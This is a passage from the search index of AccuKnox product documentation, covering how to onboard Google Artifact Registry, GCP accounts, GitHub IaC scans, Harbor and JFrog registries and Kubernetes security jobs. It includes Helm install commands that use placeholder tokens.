SaaS platform, the images are scanned continuously. The risks and vulnerabilities associated with these images are identified and shown in the scan results. The vulnerabilities are classified based on the CVSS Scores.</p>"},{"location":"how-to/gar/#steps-to-create-service-account-in-gcp-for-onboarding-gar","title":"Steps to create service account in GCP for onboarding GAR","text":"<p>Step 1: Open the GCP Management Console and sign in with your GCP account credentials. Select the Project in which the GAR registry to be scanned is located</p> <p></p> <p>Step 2: In the Navigation Menu, goto IAM &amp; Admin \u2192 Service Accounts</p> <p></p> <p>Step 3: Create a Service Account by selecting Create Service Account at the top</p> <p></p> <p>Step 4: Fill the Service Account Details such as name, description and then click Create and Continue</p> <p></p> <p>Step 5: We need two prerequisite roles for this - <code>Cloud Apigee Registry Viewer</code> and <code>Artifact Registry Reader</code>. Click on Add Role and search for <code>Cloud Apigee Registry Viewer</code> and <code>Artifact Registry Reader</code> and select them. Click Continue and Done</p> <p></p> <p>If you like, refer to what the permissions granted by the two roles:</p> <ul> <li>Cloud IAM Apigee Registry Viewer Role</li> <li>Cloud IAM Artifact Registry Reader Role</li> </ul>"},{"location":"how-to/gar/#to-generate-a-token-for-that-service-account","title":"To generate a token for that service account","text":"<p>Step 1: Click on the Service Account name you want to generate the token for.</p> <p></p> <p></p> <p>Step 2: Go to the Keys tab, click on Add Key, and select the Key Type as JSON. This will download the JSON file to your system.</p> <p></p> <p>Note</p> <p>The Private Key will be saved to your system automatically. We will require it for onboarding the GAR registry in AccuKnox SaaS.</p>"},{"location":"how-to/gar/#steps-to-onboard-the-registry-on-accuknox-saas","title":"Steps to onboard the registry on AccuKnox SaaS","text":"<p>Step 1: Login to the AccuKnox SaaS and Navigate to Issues \u2192 Registry Scan. Click on Add Registry</p> <p></p> <p>Step 2: Enter the Registry Name, Description, Registry Type, GCP Region where the GAR Registry is hosted and in the next field paste the ENTIRE content of the downloaded JSON key file for the service account.</p> <p>Click on Test Connection and then click on the enabled Save button</p> <p></p> <p>Step 3: A popup appears that the registry is added on successful onboarding. Navigate to Issues \u2192 Registry Scan to view the scan results. The status of the scan can be checked from the Scan Queue tab</p> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"how-to/gcp-onboarding/","title":"GCP Account onboarding","text":"<p>Here, we will see the steps to onboard a GCP cloud account to the AccuKnox SaaS platform</p> <p>Note: Make sure the Below API Library is enabled in your GCP Account for onboarding into AccuKnox SaaS:</p> <ol> <li>Compute Engine API</li> <li>Identity and Access Management (IAM) API</li> <li>Cloud Resource Manager API</li> <li>Cloud Functions API</li> <li>KMS API</li> <li>Kubernetes API</li> <li>Cloud SQL Admin API</li> </ol> <p>For GCP there is a requirement for IAM Service Account Access.</p> <p>Step 1:  Log into your Google Cloud console and navigate to  IAM &amp; Admin choose \u201cRoles\u201c and Click \u201cCreate Role\u201c</p> <p></p> <p>Step 2:  Name the \u201cRole\u201d and Click \u201cAdd Permission\u201d</p> <p></p> <p>Step 3:  Use the Service: storage filter then value as \u201cstorage.buckets.getIamPolicy\u201c</p> <p></p> <p>Step 4: Choose the permission and Click \u201cAdd\u201c then Click Create in the same page.</p> <p></p> <p>Step 5:  In the Navigation Panel, navigate to IAM Admin &gt; Service Accounts.</p> <p></p> <p>Step 6: Click on \"Create Service Account\"</p> <p></p> <p>Step 7: Enter any name that you want on Service Account Name.</p> <p>Step 8: Click on Continue.</p> <p></p> <p>Step 9: Select the role: Project &gt; Viewer and click Add another Role.</p> <p></p> <p>Step 10: Click \u201cAdd Another Role\u201d Choose \u201cCustom\u201c Select the created Custom Role.</p> <p></p> <p>Step 11: Click on \u201cContinue\u201c and \u201dDone\u201d</p> <p></p> <p>Step 12: Go to the created Service Account, click on that Service Account navigate to the \u201cKeys\u201c section.</p> <p></p> <p>Step 13: Click the \u201cAdd key\u201c button and \u201cCreate new key \u201c . Chosen Key type should be JSON format.</p> <p></p> <p>Step 14: Click the \u201cCreate\u201c button it will automatically download the JSON key.</p>"},{"location":"how-to/gcp-onboarding/#from-accuknox-saas-ui","title":"From AccuKnox SaaS UI","text":"<p>Step 1: Go to the AccuKnox SaaS. Navigate to the \u201cSettings\u201d \u2192 \u201cCloud Accounts\u201d then \u201cAdd Account\u201d.</p> <p></p> <p>Step 2: Click the \u201cGCP Platform\u201d</p> <p></p> <p>Step 3:  Create New Label and Add the Label for identifying the assets inside this account and add a Tag optionally.</p> <p></p> <p>Step 4:  Enter the \u201cProject ID\u201c, \u201cClient Email\u201d(The Service Account mail ID) and  \u201cPrivate Key\u201d from the downloaded File. Copy paste the entire downloaded file into the \u201dPrivate Key\u201d field . Then Click \u201cConnect\u201c</p> <p></p> <p>The cloud account has been onboarded successfully</p> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"how-to/github-iac-scan/","title":"How to Perform Github IaC Scans","text":"<p>IaC scans for GitHub are essential for identifying security vulnerabilities in your infrastructure code. By scanning your IaC, you can detect misconfigurations early, ensure compliance with security standards, and prevent potential security breaches. Integrating these scans into your CI/CD pipeline enhances your overall security posture by providing continuous monitoring and assessment.</p>"},{"location":"how-to/github-iac-scan/#configuration","title":"Configuration","text":""},{"location":"how-to/github-iac-scan/#prerequisites","title":"Prerequisites","text":"<p>For Github the IaC Scan from AccuKnox SaaS we require three prerequisites. They are as follows:</p> <ul> <li>Creating Fine-Grained tokens from GitHub for\u00a0Private Repos only</li> <li>Label creation</li> <li>Adding the Code repository</li> </ul>"},{"location":"how-to/github-iac-scan/#create-fine-grained-tokens-from-github","title":"Create Fine-Grained Tokens from GitHub","text":"<p>For generating the fine-grained access token from GitHub users need to do the following steps.</p> <p>Step 1: Go to the Github profile and select Settings.</p> <p></p> <p>Step 2: Select the Developer Settings in Settings options</p> <p></p> <p>Step 3: Select the Personal Access token\u2192 Fine-Grained Access token </p> <p>Step 4: Click on the Generate new token option</p> <p></p> <p>Step 5: Fill out the token name, description, Duration, and Repository that you need to onboard, and in the Repository permission section select the content: Readonly</p> <p></p> <p>Step 6: After this click on Generate token to get the Fine Grained access token with Read-only access to the Repository</p> <p></p>"},{"location":"how-to/github-iac-scan/#label-creation","title":"Label Creation","text":"<p>After Creating the Fine-grained Access token user needs to create a label from AccuKnox SaaS. For this user need to navigate to the Settings\u2192 label Section click on Add new label and create their label</p> <p></p>"},{"location":"how-to/github-iac-scan/#add-code-repository","title":"Add Code Repository","text":"<p>After creating the token from Github and Creating the label from AccuKnox SaaS. Users can onboard the Source Code Repository by following the steps below.</p> <p>Step 1: Navigate to the Settings\u2192 Integrations and select the Code Source Configuration</p> <p></p> <p>Step 2: Click on the Add Configuration button</p> <p></p> <p>Step3: Fill in the name select the type as Github input the Repository URL and Fine-grained Access token and click on Verify</p> <p></p> <p>Step 4: After successful Verification, you can select the branch and Label name that was created from the SaaS.</p> <p></p> <p>Step 5: Click on save to add the Source code configuration</p> <p></p>"},{"location":"how-to/github-iac-scan/#iac-scan","title":"IaC scan","text":"<p>To create an IaC scan for the added Source Code Configuration users need to perform the following steps.</p> <p>Step 1: Navigate to Settings\u2192 Integrations and select IaC</p> <p></p> <p>Step 2: Click on Add Configuration give the name and select the Repository for which you want to schedule the IaC Scan. Select the Framework type as Kubernetes yaml, helm, or Terraform and click on save to add the IaC configuration.</p> <p></p> <p>Step 3:\u00a0After saving the IaC Configuration the scan will start in the background and it will be completed sometime.</p> <p></p> <p>Step 4:\u00a0After the scan is completed the progress will change to 100% completed</p> <p></p>"},{"location":"how-to/github-iac-scan/#risk-assessment-check-findings","title":"Risk Assessment - Check Findings","text":"<p>After the IaC scan is completed to see the findings users need to navigate to the Issues\u2192 Findings section and select IaC findings in the filter to see all the findings.</p> <p></p> <p>We can filter the findings based on the Repository, Risk Factor, and so on.</p>"},{"location":"how-to/github-iac-scan/#remediation-fix-problemscreate-tickets","title":"Remediation - Fix Problems/Create Tickets","text":"<p>To remediate any findings users will need to select the finding or group of findings From the issues\u2192 Findings page and click Create Ticket as shown in the below screenshot.</p> <p></p> <p>NOTE</p> <p>Before this users must have integrated their Ticketing backend like Jira Servicenow or connects or Freshservice under Integrations \u2192 CSPM section</p> <p>After clicking on the create ticket Icon the next page will popup</p> <p></p> <p>Once the user clicks on Create Ticket new page with all the information related to the IaC findings and with a predefined Priority based on the Risk Factor. The user has to click on Create to confirm the ticket creation.</p> <p></p> <p>We support CDK scanning. For more details, refer to AWS CDK Scan.</p>"},{"location":"how-to/harbor/","title":"Harbor Registry Onboarding","text":"<p>Harbor is an open-source registry that secures artifacts with policies and role-based access control, ensures images are scanned and free from vulnerabilities, and signs images as trusted.</p>"},{"location":"how-to/harbor/#prerequisites-for-harbor-registry-onboarding-in-accuknox","title":"Prerequisites for Harbor Registry Onboarding in AccuKnox","text":"<p>In Harbor, users and groups are created by the admin. If you have admin access, then log in through those credentials. To create a new user in Harbor, you can follow the steps mentioned here:</p> <p>https://goharbor.io/docs/1.10/administration/managing-users/create-users-db/</p> <p>After creating the user, we need to add this user as a member in the Project.</p> <p>Step 1: Click on \"Projects\", select the Project in which you have to add the user.</p> <p></p> <p>Step 2: Click on the \"Members\" tab -&gt; +User -&gt; give the username and select \"Limited Guest\" role -&gt; OK</p> <p></p> <p>We have now added the member (user) in the Project.</p> <p></p> <p>Now we can onboard this user in the AccuKnox dashboard.</p>"},{"location":"how-to/harbor/#steps-to-onboard-harbor-registry-on-accuknox","title":"Steps to Onboard Harbor Registry on AccuKnox","text":"<p>Step 1: In the AccuKnox dashboard, under Issues, click on \"Registry Scan\"</p> <p>Now, click on \"Add Registry\"</p> <p></p> <p>Step 2: Give the registry name, select Label, and select \"Harbor Registry\" from the Registry type dropdown. Then, paste the Registry URL and provide the user credentials.</p> <p></p> <p>Provide the Tag pattern, and schedule time for the scanning. If you need to trigger the scan after saving, then click on the \"Trigger scan on save\" checkbox.</p> <p>Step 3: After providing all the information, click on \"Test Connection\", it should show \"Registry Tested Successfully\".</p> <p>Now, click on Save.</p> <p></p> <p>After saving the registry, the scan will start based on the scheduled time. To see whether the scanning is completed or not, go to Settings -&gt; Integrations -&gt; Registry. Here, we can see the list of onboarded registries and their details.</p> <p></p> <p>Once the scanning is completed, we can see the scan results in Issues -&gt; Registry Scan</p> <p>Under the \"Image Scanning Progress\" pie chart, select your registry to view the progress.</p> <p></p> <p>To view the details of your registry, you can use filters such as \"registry_type\", then select the \"harbor\" registry or you can also use the filter \"registry_name\" and provide the name of your registry.</p> <p></p> <p>By clicking on the repositories, we can get more details about the scan results.</p> <p></p>"},{"location":"how-to/high-level-onboarding/","title":"Onboarding Assets \u2013 High-Level Overview","text":""},{"location":"how-to/high-level-onboarding/#customer-environments","title":"Customer Environments","text":"<p>Cloud:</p> <ul> <li>AWS Accounts</li> <li>Azure Accounts</li> <li>AWS SageMaker / Bedrock</li> </ul> <p>Data Center / Hybrid:</p> <ul> <li>Kubernetes Clusters (EKS / On-Prem / Fargate)</li> <li>Virtual Machines (EC2 / On-Prem)</li> </ul> <p>Workload Types:</p> <ul> <li>K8s Clusters</li> <li>Virtual Machines</li> <li>Serverless (Fargate)</li> <li>AI/ML Services (SageMaker, Bedrock)</li> </ul> <p>Security and Telemetry Flow:</p> <ul> <li>Agentless scan initiated from SaaS</li> <li>CNAPP control plane processes telemetry</li> <li>Alerts and detections sent to SIEM</li> </ul>"},{"location":"how-to/high-level-onboarding/#cloud-onboarding-options","title":"Cloud Onboarding Options","text":"<ul> <li>Fully Agentless Mode</li> <li> <p>Account/Subscription Onboarding:</p> <ul> <li>CloudFormation (recommended)</li> <li>Terraform</li> <li>Manual</li> </ul> </li> <li> <p>AWS Organization Unit Onboarding:</p> <ul> <li>Using cross-account tenant roles</li> </ul> </li> </ul>"},{"location":"how-to/high-level-onboarding/#kubernetes-aws-eks-on-prem-fargate","title":"Kubernetes \u2013 AWS EKS / On-Prem / Fargate","text":""},{"location":"how-to/high-level-onboarding/#risk-assessment","title":"Risk Assessment","text":"<ul> <li>CIS Benchmarks</li> <li>Misconfigurations</li> <li>KIEM Policies</li> <li>Agentless methods:<ul> <li>Remote scanning via <code>kubeconfig</code></li> <li>Kubernetes job-based scanning</li> </ul> </li> </ul>"},{"location":"how-to/high-level-onboarding/#runtime-security-hardening","title":"Runtime Security &amp; Hardening","text":"<ul> <li>Helm-based installation</li> <li>In-cluster image scanning:<ul> <li>Operator and job-based deployment via Helm</li> </ul> </li> </ul>"},{"location":"how-to/high-level-onboarding/#fargate-runtime","title":"Fargate Runtime","text":"<ul> <li>Supported via sidecar model</li> <li>Deployable using Helm or Kubernetes manifests</li> </ul>"},{"location":"how-to/high-level-onboarding/#virtual-machines-ec2-on-prem","title":"Virtual Machines \u2013 EC2 / On-Prem","text":"<ul> <li>Misconfiguration scanning via cloud account onboarding (agentless)</li> <li>Risk assessment / STIGs scanning requires lightweight VM agent</li> </ul>"},{"location":"how-to/high-level-onboarding/#container-registry","title":"Container Registry","text":""},{"location":"how-to/high-level-onboarding/#saas-based-scanning","title":"SaaS-Based Scanning","text":"<ul> <li>Registry onboarded via control plane</li> <li>Credentials: Username + API Token</li> </ul>"},{"location":"how-to/high-level-onboarding/#on-prem-scanning","title":"On-Prem Scanning","text":"<ul> <li>Requires AccuKnox collector deployed on VM</li> <li>Local scanning of registries enabled</li> </ul>"},{"location":"how-to/high-level-onboarding/#aiml-workloads-sagemaker-bedrock","title":"AI/ML Workloads \u2013 SageMaker / Bedrock","text":"<ul> <li>Fully agentless</li> <li> <p>Selectable during cloud account onboarding:</p> <ul> <li>General Cloud Assets</li> <li>General Cloud + AI/ML Assets</li> </ul> </li> </ul>"},{"location":"how-to/high-level-onboarding/#deployment-references","title":"Deployment References","text":"<ul> <li>Separate detailed documentation provided for Helm charts, job configurations, and onboarding automation (CloudFormation, Terraform).</li> </ul>"},{"location":"how-to/how-to-create-labels/","title":"How to Create Labels","text":"<p>This guide on how to create labels in AccuKnox SaaS platform helps you to organize and manage your resources effectively. Labels are key-value pairs that you can attach to resources like images, registries, and repositories. You can use labels to filter and group resources based on your requirements.</p> <p>Labels are key-value pairs that are used to organize components like Policies, Cloud Accounts, and User Profiles. In the Labels section, users can create labels and can see the assets, findings, tickets, and baseline for the labels.</p> <p>Step 1:\u00a0Login to AccuKnox SaaS and navigate to Labels under Settings.</p> <p></p> <p>Step 2:\u00a0Click on\u00a0Labels, then click\u00a0Add label. Enter the\u00a0Name\u00a0and\u00a0Filename Prefix, and click\u00a0Save. The new label will now appear in the list.</p> <p></p>"},{"location":"how-to/how-to-create-tokens/","title":"How to Create Tokens","text":"<p>This guide on how to create tokens in AccuKnox SaaS platform helps you to authenticate and authorize your resources securely. Tokens are used to authenticate and authorize the users to access the AccuKnox SaaS platform. You can create tokens for different users and manage them effectively.</p> <p>API Tokens\u00a0are authentication credentials used to securely interact with various services and systems. They are crucial for operations such as cron job deployments and integrations with tools like KIEM, Kubernetes CIS Benchmark, and managing cluster misconfigurations. By providing controlled access, API tokens enable automated and secure management of resources and functionalities within the platform.</p> <p>Step 1:\u00a0Go to\u00a0Settings\u00a0and then select\u00a0Tokens.</p> <p></p> <p>Step 2:\u00a0On the Tokens page, click\u00a0Create Token. Enter a\u00a0Name\u00a0(with at least one alphabetic character) and set\u00a0Expiration\u00a0based on your need. Optionally, users can configure\u00a0Tags\u00a0under\u00a0Advanced Options\u00a0to associate tags with the generated token. Click\u00a0Generate\u00a0to create the token.</p> <p></p> <p>Copy\u00a0the token immediately and store it securely, as it will only be shown once.</p> <p></p>"},{"location":"how-to/in-cluster-image-scan-helm/","title":"In-Cluster Image Scanning with Helm","text":"<p>AccuKnox offers an in-cluster container image scanning solution designed to periodically inspect container images deployed within your Kubernetes (K8s) environment. This automated scanning process detects known vulnerabilities, promoting compliance and enhancing your cluster\u2019s overall security. All scan results, including detailed vulnerability insights, are automatically sent to the AccuKnox Control Plane, where they can be viewed and managed through an intuitive user interface.</p>"},{"location":"how-to/in-cluster-image-scan-helm/#installation-guide","title":"\ud83d\udee0 Installation Guide","text":"<p>Follow these steps to deploy the in-cluster image scanner using Helm:</p>"},{"location":"how-to/in-cluster-image-scan-helm/#1-create-a-label","title":"1. Create a Label","text":"<p>In the AccuKnox Control Plane, create a unique Label. This will be associated with the container image scan reports.</p>"},{"location":"how-to/in-cluster-image-scan-helm/#2-generate-a-token","title":"2. Generate a Token","text":"<p>From the AccuKnox Control Plane:</p> <ul> <li>Generate an Artifact Token</li> <li>Note down both the Token and your Tenant ID</li> </ul>"},{"location":"how-to/in-cluster-image-scan-helm/#3-schedule-and-deploy-the-scanner-via-helm","title":"3. Schedule and Deploy the Scanner via Helm","text":"<p>Use the following Helm command to install the scanner in your Kubernetes cluster:</p> <pre><code>helm install kubeshield oci://public.ecr.aws/k9v9d5v2/kubeshield-chart -n agents --create-namespace \\\n  --set scan.authToken=\"{{authToken}}\" \\\n  --set scan.url=\"{{url}}\" \\\n  --set scan.label=\"{{label}}\" \\\n  --set scan.cronTab=\"30 9 * * *\" \\\n  --version \"v0.1.2\"\n</code></pre> <p>Replace the parameters (<code>{{authToken}}</code>, <code>{{url}}</code>, <code>{{label}}</code> and <code>{{cronTab}}</code>) with the appropriate values.</p>"},{"location":"how-to/in-cluster-image-scan-helm/#sample-output","title":"Sample Output","text":"<pre><code>Pulled: public.ecr.aws/k9v9d5v2/kubeshield-chart:v0.1.1\nDigest: sha256:a4c1a8948db7a24d8990b71b53184f564960b2b39dbd6cba1cd6104c12addd75\nNAME: kubeshield\nLAST DEPLOYED: Mon May  5 10:08:24 2025\nNAMESPACE: agents\nSTATUS: deployed\nREVISION: 1\nTEST SUITE: None\n</code></pre>"},{"location":"how-to/in-cluster-image-scan-helm/#parameters","title":"\u2699\ufe0f Parameters:","text":"Variable Sample Value Description authToken eyJhbGc... AccuKnox Token url cspm.accuknox.com AccuKnox CSPM API Endpoint label kubeshield AccuKnox Label cronTab 30 9 * * * Schedule in Cron <p>Note: Deploy the Scanner via Helm (One Time) If you don't want to schedule and just want to trigger scan for one time, remove this flag <code>--set scan.cronTab</code></p>"},{"location":"how-to/in-cluster-image-scan-helm/#post-installation","title":"\u2705 Post-Installation","text":"<p>Once the scanner is deployed and completes a scan cycle, results will be visible in the Findings or Registry Scan sections within the AccuKnox Control Plane.</p> <ul> <li>Navigate to Issues -&gt; Findings</li> <li>Switch to Findings tab</li> <li>Select Container Image Findings &amp; do Group by based on Label Name</li> <li>You should be able to see the data for the Label used in above command</li> </ul>"},{"location":"how-to/in-cluster-image-scan-helm/#scan-status-from-cluster","title":"\ud83e\uddea Scan Status from Cluster","text":"<p>\ud83d\udd27 Check if <code>kubeshield-controller-manager</code> is running fine or not</p> <pre><code>kubectl get po -n kubeshield\nNAME                                             READY   STATUS    RESTARTS   AGE\nkubeshield-controller-manager-5dd5cbc6d4-8xg8k   1/1     Running   0          22s\n</code></pre> <p>STATUS should be Running</p>"},{"location":"how-to/jfrog-container/","title":"JFrog Container Registry Onboarding","text":"<p>JFrog Container Registry is a secure, universal repository manager specifically optimized for storing and managing container images. Widely adopted by DevOps and software teams, it supports Docker and Helm images, offering seamless integration with CI/CD pipelines to enhance workflows and ensure image security and traceability.</p> <p>JFrog Artifactory offers two primary deployment options:</p> <ol> <li> <p>Cloud-Based: Managed by JFrog, offering scalability and minimal maintenance for teams preferring a ready-to-use solution.</p> </li> <li> <p>Self-Hosted: On-premise for strict security needs, giving organizations control over configurations, with support for deployment in isolated networks.</p> </li> </ol>"},{"location":"how-to/jfrog-container/#accuknox-support-for-jfrog-container-registry-scanning","title":"AccuKnox Support for JFrog Container Registry Scanning","text":"<p>AccuKnox provides robust security scanning for container images stored in the JFrog Container Registry, regardless of deployment type. Supporting both cloud-based and self-hosted JFrog instances.</p> <ul> <li> <p>Cloud-Based JFrog Scanning: For the JFrog Container Registry deployed in the cloud, AccuKnox connects seamlessly to scan images and detect vulnerabilities in real time.</p> </li> <li> <p>Self-Hosted JFrog Scanning: AccuKnox also supports self-hosted JFrog Container Registry deployments, providing vulnerability scanning for images in private, on-premise environments.</p> <ul> <li>Isolated Network Support: AccuKnox can connect to self-hosted JFrog instances in isolated or air-gapped networks. This enables secure scanning in environments with strict compliance or network restrictions, ensuring continuous monitoring without compromising security.</li> </ul> </li> </ul> <p>The following steps outline how to onboard your JFrog Container Registry into the AccuKnox platform for ongoing security scanning, giving you real-time insights into vulnerabilities and risks within your container images.</p>"},{"location":"how-to/jfrog-container/#scanning-an-isolated-registry","title":"Scanning an Isolated Registry","text":"<p>Important: If you're using a non-isolated JFrog Container Registry (cloud-based or non-isolated self-hosted), you can skip this section. This part applies only to isolated JFrog instances.</p> <p>To get started with scanning a JFrog isolated container registry, ensure the following prerequisites are met:</p> <ol> <li> <p>Set up an isolated JFrog container registry.</p> </li> <li> <p>Ensure you have access to a Kubernetes cluster where the AccuKnox agents can be onboarded.</p> </li> </ol> <p>Once your registry is set up, the next step is to onboard the AccuKnox agents to your Kubernetes cluster.</p> <ol> <li> <p>Navigate to Settings &gt; Manage Cluster in the AccuKnox platform.</p> </li> <li> <p>Click Onboard Now to begin the process. </p> </li> <li> <p>Provide an appropriate name for your cluster in the form that appears. During the agent installation process, ensure that the Scanner for Isolated Registry Scan option is enabled. </p> </li> <li> <p>Run the following Helm command to install the AccuKnox agents</p> </li> </ol> <pre><code>helm upgrade --install agents oci://registry-1.docker.io/accuknox/accuknox-agents \\\n  --version \"v0.8.0\" \\\n  --set joinToken=\"&lt;TOKEN&gt;\" \\\n  --set spireHost=\"spire.demo.accuknox.com\" \\\n  --set ppsHost=\"pps.demo.accuknox.com\" \\\n  --set knoxGateway=\"knox-gw.demo.accuknox.com:3000\" \\\n  --set install.localRegistryAgent=true \\\n  -n agents --create-namespace\n</code></pre> <ol> <li>Verify the installation of the agents by running the following command:</li> </ol> <p><code>kubectl get pods -n agents</code></p> <p></p> <p>Once the agents are installed, navigate to the Cluster View in AccuKnox to ensure that your onboarded cluster is live and ready for scanning. This completes the onboarding process for scanning an isolated container registry in AccuKnox. The next step is to configure the registry scanning, as outlined in the previous sections.</p>"},{"location":"how-to/jfrog-container/#configuring-the-jfrog-registry","title":"Configuring the JFrog Registry","text":"<p>For this example, we'll proceed with JFrog Self-hosted.</p> <p>Next, configure the self-hosted registry to begin scanning. Choose between JFrog Cloud or Self-hosted.</p> <ol> <li> <p>Go to Settings -&gt; Integration -&gt; Registry.</p> </li> <li> <p>Click on the Add Registry button</p> </li> <li> <p>Fill out the required fields such as:</p> <ol> <li> <p>Name</p> </li> <li> <p>Description</p> </li> <li> <p>Registry Type</p> </li> <li> <p>URL</p> </li> <li> <p>Credentials</p> </li> <li> <p>Cron Expression (for scheduled scans)</p> </li> </ol> </li> <li> <p>If your JFrog Container Registry is in an isolated mode, ensure that the Isolated Registry flag is enabled in the onboarding form</p> </li> <li> <p>Test the connection. If the configuration is correct, you will receive a successful response. </p> </li> <li> <p>Once the connection is verified, save the form and create the registry. After the registry is configured and connected, it will appear as Active in the registry list.</p> </li> </ol> <p></p> <p>AccuKnox will begin scanning at the scheduled time specified during the configuration or If you've enabled the Trigger scan on the save option, the first scan will start immediately. Once the scan completes, navigate to the registry page to view the results.</p>"},{"location":"how-to/jfrog-container/#viewing-scan-details","title":"Viewing Scan Details","text":"<p>After the scan is completed, you can explore detailed information about the registry:</p> <ol> <li> <p>Go to Issues -&gt; Findings -&gt; Registry Scan.</p> </li> <li> <p>Filter the results to view the onboarded registry.</p> </li> <li> <p>Click on an image to see a detailed view of the metadata, vulnerabilities, and other scan details.</p> </li> </ol> <p>In the JFrog Self-hosted Registry that we onboarded to AccuKnox during this presentation, there is a specific package, accuknox/nginx. Below, you can see the associated vulnerabilities for this image, as highlighted in the following screenshots.</p> <p></p> <p>To get more detailed information about the vulnerabilities associated with the image, simply click on the container image in the AccuKnox dashboard. This will allow you to view the metadata, including any embedded secrets and a comprehensive list of the vulnerabilities identified in the image. You will also be able to explore the severity of these vulnerabilities, CVSS scores, and recommended remediation actions.</p> <p></p> <p>Integrating JFrog Container Registry with AccuKnox ensures continuous security scanning for container images, whether cloud-based or self-hosted. For isolated networks, AccuKnox provides secure, compliance-friendly scanning, helping you detect and address vulnerabilities efficiently.</p>"},{"location":"how-to/k8s-security-onboarding/","title":"Kubernetes Security Onboarding","text":""},{"location":"how-to/k8s-security-onboarding/#features-supported-for-kubernetes","title":"Features Supported for Kubernetes","text":"<ul> <li>Supported on managed (EKS, AKS, OCI) and on-prem Kubernetes clusters</li> <li>Works on Kubernetes versions &gt;= 1.18</li> <li>All features are modular and can be enabled independently</li> <li>Available via AccuKnox SaaS and On-Prem Control Plane with identical UX</li> <li>Runtime Security requires Linux kernel &gt;= 4.15</li> <li>Only egress connectivity from K8s cluster to control plane is required</li> </ul>"},{"location":"how-to/k8s-security-onboarding/#k8s-runtime-visibility-and-security","title":"K8s Runtime Visibility and Security","text":"<p>Deployment Mode: DaemonSet via Operator (default) or Kubernetes manifests</p> <p>Helm Command:</p> <pre><code>helm upgrade --install agents oci://public.ecr.aws/k9v9d5v2/agents-chart \\\n--version \"v0.10.0\" \\\n--set joinToken=\"[TOKEN]\" \\\n--set spireHost=\"spire.demo.accuknox.com\" \\\n--set ppsHost=\"pps.demo.accuknox.com\" \\\n--set knoxGateway=\"knox-gw.demo.accuknox.com:3000\" \\\n--set admissionController.enabled=false \\\n--set kyverno.enabled=false \\\n-n agents --create-namespace\n</code></pre> <p>Features:</p> <ul> <li>File, process, and network visibility</li> <li>MITRE-based policy enforcement (FIM, cryptojacking protection, etc.)</li> <li>Auto-discovery of ingress/egress and whitelisting policies</li> </ul> <p>Control Plane Access:</p> <ul> <li>PPS: Port 443</li> <li>SPIRE: Port 443</li> <li>Knox Gateway: Port 3000</li> </ul>"},{"location":"how-to/k8s-security-onboarding/#k8s-misconfiguration-scanning","title":"K8s Misconfiguration Scanning","text":"<p>Deployment Mode: Kubernetes cronjob</p> <p>Helm Command:</p> <pre><code>helm upgrade --install k8s-risk-assessment-job oci://public.ecr.aws/k9v9d5v2/k8s-risk-assessment-job \\\n--set accuknox.authToken=\"[AUTHTOKEN]\" \\\n--set accuknox.cronTab=\"30 9 * * *\" \\\n--set accuknox.clusterName=\"[CLUSTERNAME]\" \\\n--set accuknox.URL=\"cspm.demo.accuknox.com\" \\\n--set accuknox.label=\"[LABEL]\" \\\n--version=v1.1.3\n</code></pre> <p>Features:</p> <ul> <li>Detection of misconfigurations and insecure configurations</li> <li>Includes checks for root containers, privilege escalation, and 100+ other rules</li> </ul> <p>Control Plane Access:</p> <ul> <li>HTTPS access to Artifact Endpoint</li> </ul>"},{"location":"how-to/k8s-security-onboarding/#k8s-identity-entitlements-management","title":"K8s Identity &amp; Entitlements Management","text":"<p>Deployment Mode: Kubernetes cronjob</p> <p>Helm Command:</p> <pre><code>helm upgrade --install kiem-job oci://public.ecr.aws/k9v9d5v2/kiem-job \\\n--set accuknox.label=\"[LABEL]\" \\\n--version v1.1.3 \\\n--set accuknox.URL=\"cspm.demo.accuknox.com\" \\\n--set accuknox.authToken=\"[AUTHTOKEN]\" \\\n--set accuknox.cronTab=\"30 9 * * *\" \\\n--set accuknox.clusterName=\"[CLUSTERNAME]\" \\\n</code></pre> <p>Features:</p> <ul> <li>Identifies overly permissive role bindings</li> <li>Graph-based identity view</li> <li>Detection of dangling service accounts and cross-namespace access</li> </ul> <p>Control Plane Access:</p> <ul> <li>HTTPS access to Artifact Endpoint</li> </ul>"},{"location":"how-to/k8s-security-onboarding/#k8s-cis-benchmarking","title":"K8s CIS Benchmarking","text":"<p>Deployment Mode: Kubernetes cronjob</p> <p>Helm Command:</p> <pre><code>helm upgrade --install cis-k8s-job oci://public.ecr.aws/k9v9d5v2/cis-k8s-job \\\n--set accuknox.url=\"cspm.demo.accuknox.com\" \\\n--set accuknox.authToken=\"[AUTHTOKEN]\" \\\n--set accuknox.cronTab=\"30 9 * * *\" \\\n--set accuknox.clusterName=\"[CLUSTERNAME]\" \\\n--set accuknox.label=\"[LABEL]\" \\\n--version v1.1.3\n</code></pre> <p>Features:</p> <ul> <li> <p>Benchmarks support for:</p> </li> <li> <p>Kubernetes (generic)</p> </li> <li>EKS</li> <li>AKS</li> <li> <p>GKE</p> </li> <li> <p>OKE not currently supported</p> </li> </ul> <p>Control Plane Access:</p> <ul> <li>HTTPS access to Artifact Endpoint</li> </ul>"},{"location":"how-to/k8s-security-onboarding/#disa-stigs-support","title":"DISA STIGs Support","text":"<p>Deployment Mode: Kubernetes cronjob</p> <p>Helm Command:</p> <pre><code>helm upgrade --install k8s-stig-job oci://public.ecr.aws/k9v9d5v2/k8s-stig-job \\\n--set accuknox.url=\"cspm.demo.accuknox.com\" \\\n--set accuknox.authToken=\"[AUTHTOKEN]\" \\\n--set accuknox.cronTab=\"30 9 * * *\" \\\n--set accuknox.clusterName=\"[CLUSTERNAME]\" \\\n--set accuknox.label=\"[LABEL]\" \\\n--version v1.1.3\n</code></pre> <p>Features:</p> <ul> <li>DISA Special Technical Implementation Guidelines (STIGs) compliance</li> </ul> <p>Control Plane Access:</p> <ul> <li>HTTPS access to Artifact Endpoint</li> </ul>"},{"location":"how-to/k8s-security-onboarding/#in-cluster-container-image-scanning","title":"In-Cluster Container Image Scanning","text":"<p>Deployment Mode: CronJob (per node job)</p> <p>Helm Command:</p> <pre><code>helm install kubeshield kubeshield-chart \\\n--set scan.artifactToken=\"&lt;TOKEN&gt;\" \\\n--set scan.artifactEndpoint=\"https://cspm.demo.accuknox.com/api/v1/artifact/\" \\\n--set scan.label=\"&lt;LABEL&gt;\"\n</code></pre> <p>Features:</p> <ul> <li>Direct in-cluster image scanning (no registry access required)</li> <li>Scans cached images on nodes</li> <li>Reports sent to AccuKnox console for triage</li> </ul> <p>Control Plane Access:</p> <ul> <li>HTTPS access to Artifact Endpoint</li> 